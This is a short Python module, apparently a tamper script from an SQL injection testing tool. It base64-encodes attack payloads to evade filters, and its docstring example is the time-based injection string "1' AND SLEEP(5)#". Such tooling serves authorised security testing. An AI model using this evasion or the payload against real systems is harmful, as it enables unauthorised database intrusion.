import base64

from main_modules.settings import PRIORITY
__priority__ = PRIORITY.NORMAL


from main_modules.settings import UNICODE_ENCODING

def tamper(payload, **kwargs):
    """
    Base64 all characters in a given payload

    >>> tamper("1' AND SLEEP(5)#")
    'MScgQU5EIFNMRUVQKDUpIw=='
    """

    return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload
